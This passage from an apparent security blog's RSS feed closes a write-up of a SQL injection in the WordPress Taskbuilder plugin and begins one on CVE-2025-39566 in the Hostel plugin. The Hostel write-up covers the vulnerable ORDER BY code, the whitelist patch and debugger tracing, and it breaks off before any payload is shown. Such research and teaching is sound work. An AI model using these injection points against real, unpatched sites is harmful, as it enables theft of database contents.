&lt;code&gt;None&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Wrong &lt;code&gt;proj_id&lt;/code&gt;: response contains &lt;code&gt;None&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Time-based SQLi could also be used, but dumping large data sets would be slow.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-39569&lt;/strong&gt; vulnerability in &lt;strong&gt;WordPress Taskbuilder&lt;/strong&gt; arises from the missing single quotes &lt;code&gt;&#39;...&#39;&lt;/code&gt; around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;v4.0.2&lt;/strong&gt; fixed this by wrapping &lt;code&gt;$proj_id&lt;/code&gt; in quotes, ensuring it is always treated as a literal string in SQL.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key Takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Prefer &lt;strong&gt;prepared statements&lt;/strong&gt; (&lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; in WordPress) over manually inserting variables into queries.&lt;/li&gt;&#xA;&lt;li&gt;For WordPress plugins, thoroughly test &lt;strong&gt;Ajax endpoints&lt;/strong&gt;, as they are the most common sources of SQLi and XSS.&lt;/li&gt;&#xA;&lt;li&gt;Administrators should regularly update plugins/themes to receive security patches promptly.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Taskbuilder &amp;lt;= 4.0.1 Vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39566 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-21-cve-2025-39566/</link>
      <pubDate>Sun, 21 Sep 2025 22:27:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-21-cve-2025-39566/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;A vulnerability in the &lt;strong&gt;Hostel&lt;/strong&gt; plugin prior to version &lt;strong&gt;1.1.5.7&lt;/strong&gt;. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39566&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39566&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.6 (High)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool capable of comparing two versions to show differences&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The root cause is that the application injects data from a &lt;strong&gt;GET&lt;/strong&gt; request directly into an SQL query while the validation/whitelisting is insufficient.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable version and the patched version.&#xA;A clear difference exists in the file &lt;strong&gt;controllers/bookings.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#xA;    $ob = sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]);&#xA;    if(!in_array($ob, [&amp;#39;tB.id&amp;#39;, &amp;#39;tB.contact_name&amp;#39;, &amp;#39;tB.contact_email&amp;#39;, &amp;#39;tB.from_date&amp;#39;, &amp;#39;tB.amount_paid&amp;#39;, &amp;#39;tB.status&amp;#39;])) {&#xA;        $ob = &amp;#39;tB.id&amp;#39;;&#xA;    }&#xA;    $orderby = &amp;#34;ORDER BY $ob $dir&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The patch uses a &lt;strong&gt;whitelist&lt;/strong&gt; to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to &lt;code&gt;&#39;tB.id&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Analysis&lt;/strong&gt;: The vulnerability appears because the &lt;code&gt;ob&lt;/code&gt; parameter is passed directly into the &lt;code&gt;ORDER BY&lt;/code&gt; clause after &lt;code&gt;sanitize_text_field()&lt;/code&gt;. That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To inject, we need to identify the complete query used here:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The query resides in the &lt;code&gt;default&lt;/code&gt; branch of the &lt;code&gt;switch&lt;/code&gt; structure.&lt;/p&gt;&#xA;&lt;p&gt;All this logic belongs to the static &lt;code&gt;manage()&lt;/code&gt; method of the &lt;code&gt;WPHostelBookings&lt;/code&gt; class.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            case &amp;#39;add&amp;#39;: // add handle&#xA;            break;&#xA;&#xA;            case &amp;#39;edit&amp;#39;: // edit handle&#xA;            break;&#xA;&#xA;            // view/print booking details. Will allow also to confirm/cancel&#xA;            case &amp;#39;view&amp;#39;: // view handle&#x9;&#x9;&#x9;&#xA;            break;&#x9;&#x9;&#x9;&#xA;&#xA;            // list bookings&#xA;            default:&#xA;            // another logic&#xA;&#xA;            if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;                $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;            }&#xA;&#xA;            $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;            FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;            WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;&#xA;            // another logic&#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In WordPress, plugins communicate with core via the &lt;strong&gt;Plugin API (Hook System)&lt;/strong&gt;. Therefore, to find where &lt;code&gt;manage()&lt;/code&gt; is invoked, we can search for the string &lt;code&gt;&amp;quot;manage&amp;quot;&lt;/code&gt; in the plugin folder.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_manage.png&#34; title=&#34;Search&#34; data-thumbnail=&#34;/posts/2025-09-21-cve-2025-39566/search_manage.png&#34; data-sub-html=&#34;&lt;h2&gt;search manage()&lt;/h2&gt;&lt;p&gt;Search&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_manage.png&#39; alt=&#34;search manage()&#34; height=&#34;278&#34; width=&#34;631&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the file &lt;code&gt;models/hostel.php&lt;/code&gt; we have:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class class WPHostel {&#xA;    // another logic&#xA;&#xA;    static function menu() {&#xA;        // we use &amp;#39;hostelpro_manage&amp;#39; for consistency with the pro version&#xA;        $wphostel_caps = current_user_can(&amp;#39;manage_options&amp;#39;) ? &amp;#39;manage_options&amp;#39; : &amp;#39;hostelpro_manage&amp;#39;;     &#xA;&#xA;        add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_rooms&amp;#39;, array(&amp;#39;WPHostelRooms&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_unavailable&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;unavailable&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_emaillog&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;email_log&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_help&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;index&amp;#34;));     &#xA;    }&#xA;&#xA;    // another logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;add_menu_page()&lt;/code&gt; creates the &lt;strong&gt;main menu&lt;/strong&gt; in the Admin Dashboard.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_submenu_page()&lt;/code&gt; adds &lt;strong&gt;submenu&lt;/strong&gt; items under that menu.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;$callback&lt;/code&gt; parameter is the &lt;strong&gt;callback function&lt;/strong&gt; invoked when a user clicks the menu/submenu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;, $icon_url = &amp;#39;&amp;#39;, $position = null);&#xA;add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;    array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;&#xA;// add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;);&#xA;add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;&#xA;// array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); =&amp;gt; WPHostelBookings::manage()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All these menu/submenu items are registered inside the static &lt;code&gt;menu()&lt;/code&gt; method of the &lt;code&gt;WPHostel&lt;/code&gt; class. To locate where &lt;code&gt;menu()&lt;/code&gt; is called, search for the &lt;code&gt;menu&lt;/code&gt; hook in the plugin directory.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_menu.png&#34; title=&#34;Search menu&#34; data-thumbnail=&#34;/posts/2025-09-21-cve-2025-39566/search_menu.png&#34; data-sub-html=&#34;&lt;h2&gt;search menu()&lt;/h2&gt;&lt;p&gt;Search menu&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_menu.png&#39; alt=&#34;search menu()&#34; height=&#34;278&#34; width=&#34;631&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search menu&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the plugin root file &lt;code&gt;hostel.php&lt;/code&gt; we have:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;admin_menu&amp;#39;, array(&amp;#34;WPHostel&amp;#34;, &amp;#34;menu&amp;#34;));&#xA;&#xA;// =&amp;gt; callback: WPHostel::menu()&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;add_action()&lt;/code&gt; is the WordPress Plugin API that attaches a &lt;strong&gt;callback&lt;/strong&gt; to an &lt;strong&gt;action hook&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The hook name here is &lt;code&gt;admin_menu&lt;/code&gt;, meaning &lt;code&gt;WPHostel::menu()&lt;/code&gt; will be called during the lifecycle when WordPress builds the Admin Dashboard Menu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Menu in the Admin UI&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/menu_ui.png&#34;&#xA;    alt=&#34;Menu UI&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Menu UI&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The faulty functionality is in the &lt;strong&gt;Booking Manager&lt;/strong&gt;, so navigate to the &lt;code&gt;Manage Bookings&lt;/code&gt; submenu in the Admin UI.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Right before the default branch there is a comment &lt;code&gt;// list bookings&lt;/code&gt; — indicating this code handles &lt;strong&gt;listing and ordering bookings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Open your debugger:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Click &lt;kbd&gt;Run with Debugger&lt;/kbd&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Set a &lt;strong&gt;breakpoint&lt;/strong&gt; at the &lt;code&gt;switch&lt;/code&gt; branch that contains the vulnerable code and at the exact line that assigns the vulnerable value.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;When you click a column header in the bookings table, observe:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The debugger steps into the &lt;code&gt;switch&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;strong&gt;Step Over&lt;/strong&gt; to reach the &lt;code&gt;default&lt;/code&gt; branch.&lt;/li&gt;&#xA;&lt;li&gt;Continue &lt;strong&gt;Step Over&lt;/strong&gt; and inspect variables in &lt;code&gt;Variables &amp;gt; Locals&lt;/code&gt;. These variables combine to form the SQL query below.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;After combining the variables, the full query looks like:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;FROM wp_hostel_bookings tB &#xA;JOIN wp_hostel_rooms tR ON tR.id = tB.room_id &#xA;WHERE is_static=0 AND tB.id = ... &#xA;ORDER BY tB.amount_paid ASC|DESC &#xA;LIMIT ...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notably, the &lt;code&gt;$orderby&lt;/code&gt; variable is assigned as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;⚠️ Issues here:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The part after &lt;code&gt;ORDER BY&lt;/code&gt; uses &lt;code&gt;sanitize_text_field()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;That function only &lt;strong&gt;cleans HTML&lt;/strong&gt;, and does not validate or filter input to make it safe in an &lt;strong&gt;SQL context&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Therefore the &lt;code&gt;ob&lt;/code&gt; parameter (provided by the user) can be abused to 